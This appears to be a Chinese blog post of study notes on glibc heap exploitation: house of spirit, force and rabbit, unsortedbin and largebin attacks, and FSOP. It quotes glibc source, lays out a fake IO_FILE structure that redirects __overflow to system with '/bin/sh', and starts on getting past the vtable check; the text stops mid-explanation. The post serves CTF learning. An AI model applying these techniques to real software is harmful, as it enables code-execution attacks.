<h3 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h3><p>通过伪造chunk，来申请这块chunk，从而进行任意地址写</p>
<h4 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h4><ol>
<li>fake chunk的size在fastbin的范围中</li>
<li>fake chunk的size在fastbin的范围中</li>
<li>fake chunk的next chunk的size大小满足大于2*SIZE_SZ（64位程序中SIZE_SZ为8），小于av-&gt;system_mem（在main_arena中，默认为128kb）</li>
<li>fake chunk与对应的fastbin链表头chunk不同（会检查是否double free）</li>
</ol>
<h3 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h3><p>通过修改topchunk的size，使得可以完成任意地址分配chunk，从而达到修改的效果</p>
<h4 id="利用条件：-1"><a href="#利用条件：-1" class="headerlink" title="利用条件："></a>利用条件：</h4><ol>
<li><em>libc2.27</em> 之前，之后对topchunk增加的检测</li>
<li>分配的 <em>size</em> 没有限制</li>
</ol>
<h4 id="攻击步骤："><a href="#攻击步骤：" class="headerlink" title="攻击步骤："></a>攻击步骤：</h4><ol>
<li>利用 <em>top chunk</em> 的 <em>size</em> 的 <em>unsigned int</em> 类型强转，修改 <code>size=-1</code>,即<code>0xffffffffffffffff</code>，这样就可以任意分配</li>
<li>将 <em>malloc_size</em> 设置为 <em>target_addr-topchunk_ptr-0x10*2</em> ,接着 <em>malloc(malloc_size)</em> 就可以使得 <em>topchunk</em> 转移到对应的地址</li>
<li>继续malloc，即可实现任意地址分配chunk</li>
</ol>
<h3 id="house-of-rabbit"><a href="#house-of-rabbit" class="headerlink" title="house of rabbit"></a>house of rabbit</h3><p>通过 <em>malloc_consilidate()</em> 造成 <em>heap_overlap</em> 或者引入 <em>fake_chunk</em> 成为合法 <em>chunk</em> </p>
<h4 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h4><p><em>malloc_consolidate()</em> 函数对于fastbin的size检查缺失，从而可以进行利用</p>
<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件:"></a>利用条件:</h4><ol>
<li><em>fastbin_chunk</em> 的 <em>size</em> 可控。例如：fastbin中存在两个 <code>0x20</code> 大小的chunk，，我们修改其中一个的size为0x40，即可造成 <em>heap_overlap</em> </li>
<li>修改fastbin的 fd，将其引入fastbin的链表中，可以将其合法化，但是要注意伪造 <em>fake_chunk’s next_chunk</em> 的size和 <em>next_chunk‘s next_chunk</em> 的size(prev_inuse为1)</li>
</ol>
<h3 id="Unsortedbin-Attack"><a href="#Unsortedbin-Attack" class="headerlink" title="Unsortedbin Attack"></a>Unsortedbin Attack</h3><p>常用来向一个地址写入一个大数，经常配合 <em>global_max_fast || tcache_struct_prethread</em> 食用，用来利用 <em>fastbin || tcachebin</em> </p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/142801582">合天网安对于libc2.29下类似于unsortedbinAttack的利用</a></p>
<h3 id="largebin-Attack"><a href="#largebin-Attack" class="headerlink" title="largebin Attack"></a>largebin Attack</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理:"></a>原理:</h4><p>问题主要出在源码的这个部分</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<span class="comment">//1</span></span><br><span class="line">    fwd-&gt;bk_nextsize = victim;</span><br><span class="line">    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<span class="comment">//2</span></span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">bck = fwd-&gt;bk;</span><br><span class="line">...</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;<span class="comment">//3</span></span><br></pre></td></tr></table></figure>

<h4 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件:"></a>前提条件:</h4><p>已经有一个 <em>chunk_A</em> 在largebin的的链表中，并且又一个略大于 <em>chunk_A’s size</em> 的 <em>chunk_B</em> 加入largebin，这里有 <em>victim&#x3D;chunk_B&amp;&amp;fwd&#x3D;chunk_A</em> 我们知道，在largebin中，<em>fd_nextsize</em> 指向的是前一个比自己小的chunk。倘若我们 <strong>修改victim的bk为addr1-0x10，victim的bk_nextsize为addr-0x20，就可以向addr1&amp;addr2中写入 victim的值(一个很大的数)，这是结合1,2,3推断出来的</strong> </p>
<h3 id="IO-FILE利用"><a href="#IO-FILE利用" class="headerlink" title="IO_FILE利用"></a>IO_FILE利用</h3><p>FILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。 FILE 结构在程序执行 fopen 等函数时会进行创建，并分配在堆中。我们常定义一个指向 FILE 结构的指针来接收这个返回值。</p>
<p>FILE结构体如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class="line">  _IO_off64_t _offset;</span><br><span class="line"><span class="meta"># <span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">  <span class="type">void</span> *__pad1;</span><br><span class="line">  <span class="type">void</span> *__pad2;</span><br><span class="line">  <span class="type">void</span> *__pad3;</span><br><span class="line">  <span class="type">void</span> *__pad4;</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>事实上，_IO_FILE的外层有一层 <em>_IO_FILE_Plus</em> 结构如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>对于 <em>_IO_jump_t</em> 其结构如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>可以看到，IO最终调用的都是这些函数，比如puts最终会调用 <em>_IO_xsputn_t</em> </p>
<h4 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h4><h5 id="适用版本："><a href="#适用版本：" class="headerlink" title="适用版本："></a>适用版本：</h5><p>libc2.23</p>
<h5 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h5><p>劫持 <em>vtable||_chain</em> 字段，伪造 <em>IO_FILE</em> 。主要是通过调用 <em>IO_flush_all_lockp()</em> 触发，触发条件如下</p>
<ol>
<li>libc检测到内存错误，执行abort函数,<strong>要求libc&lt;2.26</strong></li>
<li>程序执行exit()函数</li>
<li>程序从main函数返回</li>
</ol>
<p><img src="/../images/1693380789313.png" alt="1693380789313"></p>
<p>我们先看一下 <em>IO_flush_all_lockp()</em> 函数的源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="type">int</span> last_stamp;</span><br><span class="line"> </span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ...</span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)   <span class="comment">//如果输出缓冲区有数据，刷新输出缓冲区</span></span><br><span class="line">    result = EOF;</span><br><span class="line"> </span><br><span class="line">    fp = fp-&gt;_chain; <span class="comment">//遍历链表</span></span><br><span class="line">    &#125;</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里推荐一篇文章</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5508">IOFILE利用</a></p>
<p><img src="/../images/1693383208549.png" alt="1693383208549"></p>
<p>(感慨</p>
<p>所以FSOP其实就是通过伪造 <em>_chain</em> 字段和劫持 <em>vtable</em> 去劫持 <em>_IO_OVERFLOW</em> ，其参数为flags，即 <em>IO_FILE_Struct</em> 首地址，从而完成劫持</p>
<h5 id="利用条件：-2"><a href="#利用条件：-2" class="headerlink" title="利用条件："></a>利用条件：</h5><p>伪造IO FILE结构体，并利用漏洞将<code>_IO_list_all</code>指向伪造的结构体，或是将该链表中的一个节点（<code>_chain</code>字段）指向伪造的数据，最终触发<code>_IO_flush_all_lockp</code>，绕过检查，调用<code>_IO_OVERFLOW</code>时实现执行流劫持。</p>
<p><strong>其中，绕过条件是检查缓冲区中是否有数据</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br></pre></td></tr></table></figure>

<p>于是，2.23下的FSOP可以构造如下的chunk</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">._chain =&gt; chunk_addr</span><br><span class="line">chunk_addr</span><br><span class="line">&#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="string">&quot;/bin/sh\x00&quot;</span>, <span class="comment">//对应此结构体首地址(fp)</span></span><br><span class="line">    _IO_read_ptr = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_ptr = <span class="number">0x1</span>,</span><br><span class="line">      ...</span><br><span class="line">      _mode = <span class="number">0x0</span>, <span class="comment">//一般不用特意设置</span></span><br><span class="line">      _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = heap_addr</span><br><span class="line">&#125;</span><br><span class="line">heap_addr</span><br><span class="line">&#123;</span><br><span class="line">  __dummy = <span class="number">0x0</span>,</span><br><span class="line">  __dummy2 = <span class="number">0x0</span>,</span><br><span class="line">  __finish = <span class="number">0x0</span>,</span><br><span class="line">  __overflow = system_addr,</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="2-24下的FSOP"><a href="#2-24下的FSOP" class="headerlink" title="2.24下的FSOP"></a>2.24下的FSOP</h4><p>在libc2.24之后，对虚表加入了检查，若是无法通过检查就会报错</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) \</span></span><br><span class="line"><span class="meta">  (IO_validate_vtable                                                   \</span></span><br><span class="line"><span class="meta">   (*(struct _IO_jump_t **) ((void *) &amp;_IO_JUMPS_FILE_plus (THIS)   \</span></span><br><span class="line"><span class="meta">                 + (THIS)-&gt;_vtable_offset)))</span></span><br></pre></td></tr></table></figure>

<p>由此可以看出，在表用vtabel函数之前，内联进入了IO_validate_vtable函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t * <span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *ptr = (<span class="type">const</span> <span class="type">char</span> *) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length)) <span class="comment">//检查vtable指针是否在glibc的vtable段中。</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们要知道的是，glibc中有一个段存放的是各个vtable指针，如果不在glbc段内，就继续调用 _<em>IO_vtable_check</em> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> attribute_hidden _IO_vtable_check (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="type">void</span> (*flag) (<span class="type">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (flag);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (flag == &amp;_IO_vtable_check) <span class="comment">//检查是否是外部重构的vtable</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"> </span><br><span class="line">  &#123;</span><br><span class="line">    Dl_info di;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (_dl_open_hook != <span class="literal">NULL</span></span><br><span class="line">        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="literal">NULL</span>) != <span class="number">0</span></span><br><span class="line">            &amp;&amp; l-&gt;l_ns != LM_ID_BASE)) <span class="comment">//检查是否是动态链接库中的vtable</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">...</span><br><span class="line"> </span><br><span class="line">  __libc_fatal (<span class="string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以，最好的办法就是，我们伪造的vtable应该在glibc的vtable段中，这样子就可以很自然的绕过这个检查，目前来说有以下几种比较好用的方法</p>
<ol>
<li><p>利用 <em>_IO_str_jumps</em> 中的 <em>_IO_str_finish()</em> 函数</p>
<p>该结构体的源码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>可以发现，这里有一句 <code>JUMP_INIT(finish, _IO_str_finish)</code> </p>
<p>继续对源码分析：</p>
